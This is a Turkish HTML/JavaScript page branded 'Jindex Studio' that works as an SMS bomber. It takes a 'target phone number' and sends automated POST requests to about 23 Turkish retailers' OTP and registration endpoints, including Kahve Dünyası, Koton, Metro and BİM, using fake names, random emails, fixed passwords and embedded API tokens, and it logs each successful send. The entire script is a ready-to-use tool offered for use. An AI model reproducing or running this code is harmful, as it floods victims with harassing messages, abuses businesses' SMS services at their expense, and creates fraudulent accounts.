<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jindex Studio | Sunucu Paneli</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0b0c0e; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #16181c; }
        ::-webkit-scrollbar-thumb { background: #2c3036; border-radius: 10px; }
        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
        .slide-up { animation: slideUp 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="text-zinc-200 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">

    <div class="fade-in max-w-md w-full bg-[#121418] border border-zinc-800/60 rounded-2xl p-6 shadow-2xl shadow-black/40">
        
        <div class="text-center mb-8">
            <h1 class="text-xl font-semibold tracking-wide text-white">JINDEX STUDIO</h1>
            <p class="text-xs text-zinc-500 mt-1 uppercase tracking-widest font-medium">SMS Request System v2026</p>
        </div>

        <div class="space-y-4">
            <div>
                <label class="block text-xs font-medium text-zinc-400 mb-1.5 ml-1">Hedef Telefon Numarası</label>
                <input type="text" id="phoneInput" placeholder="5xxxxxxxx" maxlength="10"
                       class="w-full bg-[#181a20] border border-zinc-800 focus:border-zinc-600 rounded-xl px-4 py-3 text-sm text-white placeholder-zinc-600 outline-none transition-all duration-300 tracking-wider">
            </div>

            <button id="startBtn" onclick="startProcess()"
                    class="w-full bg-zinc-100 hover:bg-white text-zinc-950 font-medium text-sm py-3 px-4 rounded-xl transition-all duration-300 cursor-pointer shadow-lg shadow-white/5 active:scale-[0.99]">
                Sistemi Başlat
            </button>
        </div>

        <div id="monitorArea" class="hidden mt-8 border-t border-zinc-800/80 pt-6">
            <div class="flex items-center justify-between mb-3 px-1">
                <span class="text-xs font-semibold tracking-wider text-zinc-400 uppercase flex items-center gap-2">
                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                    Canlı İzleme Monitörü
                </span>
                <span id="loader" class="text-[11px] text-zinc-500 font-medium animate-pulse">İstekler gönderiliyor...</span>
            </div>

            <div id="logConsole" class="w-full h-48 bg-[#181a20] border border-zinc-800/50 rounded-xl p-3 overflow-y-auto space-y-2 flex flex-col">
            </div>
        </div>

        <div class="mt-8 text-center">
            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları sablıdır.</p>
        </div>

    </div>

    <script>
        function logMessage(msg, type) {
            const logConsole = document.getElementById("logConsole");
            const logRow = document.createElement("div");
            logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
            
            if (type === "success") {
                logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
            } else {
                logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
            }
            
            logRow.innerText = msg;
            logConsole.appendChild(logRow);
            logConsole.scrollTo({ top: logConsole.scrollHeight, behavior: 'smooth' });
        }

        function generateRandomData() {
            let letters = 'abcdefghijklmnopqrstuvwxyz';
            let mail = '';
            for (let i = 0; i < 22; i++) mail += letters.charAt(Math.floor(Math.random() * letters.length));
            return mail + "@gmail.com";
        }

        async function startProcess() {
            const phoneInput = document.getElementById("phoneInput");
            const startBtn = document.getElementById("startBtn");
            const monitorArea = document.getElementById("monitorArea");
            const logConsole = document.getElementById("logConsole");
            const loader = document.getElementById("loader");

            if (phoneInput.value.length !== 10) {
                alert("Lütfen numarayı başında 0 olmadan 10 hane olarak girin.");
                return;
            }

            phoneInput.disabled = true;
            startBtn.disabled = true;
            startBtn.classList.add("opacity-50", "cursor-not-allowed");
            logConsole.innerHTML = "";
            monitorArea.classList.remove("hidden");
            loader.innerText = "İstekler gönderiliyor...";
            loader.className = "text-[11px] text-zinc-500 font-medium animate-pulse";

            const phone = phoneInput.value;
            const mail = generateRandomData();

            // Tüm 24 API Servis Tanımlamaları
            const services = [
                {
                    name: "kahvedunyasi",
                    url: "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ countryCode: "90", phoneNumber: phone }) },
                    check: async (r) => { let j = await r.json(); return j.processStatus === "Success"; }
                },
                {
                    name: "wmf",
                    url: "https://www.wmf.com.tr/users/register/",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `confirm=true&date_of_birth=1956-03-01&email=${encodeURIComponent(mail)}&email_allowed=true&first_name=Memati&gender=male&last_name=Bas&password=31ABC..abc31&phone=0${phone}` },
                    check: async (r) => r.status === 202
                },
                {
                    name: "bim",
                    url: "https://bim.veesk.net/service/v1.0/account/login",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "englishhome",
                    url: "https://www.englishhome.com/api/member/sendOtp",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ Phone: phone, XID: "" }) },
                    check: async (r) => { let j = await r.json(); return j.isError === false; }
                },
                {
                    name: "suiste",
                    url: "https://suiste.com/api/auth/code",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `action=register&gsm=${phone}&full_name=Memati+Bas&password=31MeMaTi31` },
                    check: async (r) => { let j = await r.json(); return j.code === "common.success"; }
                },
                {
                    name: "kimgb",
                    url: "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ msisdn: `90${phone}` }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "evidea",
                    url: "https://www.evidea.com/users/register/",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `first_name=Memati&last_name=Bas&email=${encodeURIComponent(mail)}&phone=0${phone}&password=31ABC..abc31&confirm=true&sms_allowed=true` },
                    check: async (r) => r.status === 202
                },
                {
                    name: "ucdortbes",
                    url: "https://api.345dijital.com/api/users/register",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: "", name: "Memati", trackingNumber: `+90${phone}`, surname: "Bas" }) },
                    check: async (r) => { let j = await r.json(); return j.error !== "E-Posta veya telefon zaten kayıtlı!"; }
                },
                {
                    name: "tiklagelsin",
                    url: "https://svc.apps.tiklagelsin.com/user/graphql",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ operationName: "GENERATE_OTP", query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", variables: { challenge: "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", deviceUniqueId: "720932D5-47BD-46CD-A4B8-086EC49F81AB", phone: `+90${phone}` } }) },
                    check: async (r) => { let j = await r.json(); return j.data?.generateOtp === true; }
                },
                {
                    name: "naosstars",
                    url: "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ telephone: `+90${phone}`, type: "register" }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "koton",
                    url: "https://www.koton.com/users/register/",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `first_name=Memati&last_name=Bas&email=${encodeURIComponent(mail)}&password=31ABC..abc31&phone=0${phone}&confirm=true&sms_allowed=true` },
                    check: async (r) => r.status === 202
                },
                {
                    name: "hayatsu",
                    url: "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `mobilePhoneNumber=${phone}&actionType=register` },
                    check: async (r) => { let j = await r.json(); return j.is_success === true; }
                },
                {
                    name: "hizliecza",
                    url: "https://prod.hizliecza.net/mobil/account/sendOTP",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ otpOperationType: 1, phoneNumber: `+90${phone}` }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "metro",
                    url: "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ methodType: "2", mobilePhoneNumber: phone }) },
                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
                },
                {
                    name: "file",
                    url: "https://api.filemarket.com.tr/v1/otp/send",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ mobilePhoneNumber: `90${phone}` }) },
                    check: async (r) => { let j = await r.json(); return j.responseType === "SUCCESS"; }
                },
                {
                    name: "akasya",
                    url: "https://akasyaapi.poilabs.com/v1/en/sms",
                    opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5" }, body: JSON.stringify({ phone: phone }) },
                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
                },
                {
                    name: "akbati",
                    url: "https://akbatiapi.poilabs.com/v1/en/sms",
                    opts: { method: "POST", headers: { "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3" }, body: JSON.stringify({ phone: phone }) },
                    check: async (r) => { let j = await r.json(); return j.result === "SMS sended succesfully!"; }
                },
                {
                    name: "komagene",
                    url: "https://gateway.komagene.com.tr/auth/auth/smskodugonder",
                    opts: { method: "POST", headers: { "Content-Type": "application/json", "Firmaid": "32" }, body: JSON.stringify({ FirmaId: 32, Telefon: phone }) },
                    check: async (r) => { let j = await r.json(); return j.Success === true; }
                },
                {
                    name: "porty",
                    url: "https://panel.porty.tech/api.php?",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ job: "start_login", phone: phone }) },
                    check: async (r) => { let j = await r.json(); return j.status === "success"; }
                },
                {
                    name: "tasdelen",
                    url: "https://tasdelen.sufirmam.com:3300/mobile/send-otp",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone }) },
                    check: async (r) => { let j = await r.json(); return j.result === true; }
                },
                {
                    name: "uysal",
                    url: "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone_number: phone }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "yapp",
                    url: "https://yapp.com.tr/api/mobile/v1/register",
                    opts: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ app_version: "1.1.5", phone_number: phone, firstname: "Memati", lastname: "Bas", email: mail }) },
                    check: async (r) => r.status === 200
                },
                {
                    name: "yilmazticaret",
                    url: "https://app.buyursungelsin.com/api/customer/form/checkx",
                    opts: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: `fonksiyon=customer%2Fform%2Fcheckx&method=POST&telephone=0${phone}` },
                    check: async (r) => r.status === 200
                }
            ];

            // İstekleri 400ms aralıklarla sırayla tetikle
            for (let svc of services) {
                try {
                    let response = await fetch(svc.url, { ...svc.opts, mode: 'cors' });
                    let isSuccess = await svc.check(response);
                    if (isSuccess) {
                        logMessage(`Başarılı! ${phone} --> ${svc.name}`, "success");
                    } else {
                        logMessage(`Başarısız! ${phone} --> ${svc.name}`, "fail");
                    }
                } catch (e) {
                    logMessage(`Başarısız! ${phone} --> ${svc.name}`, "fail");
                }
                await new Promise(resolve => setTimeout(resolve, 400));
            }

            loader.innerText = "Tamamlandı";
            loader.classList.remove("animate-pulse");
            loader.classList.add("text-emerald-400");
            startBtn.disabled = false;
            startBtn.classList.remove("opacity-50", "cursor-not-allowed");
            phoneInput.disabled = false;
        }
    </script>
</body>
</html>
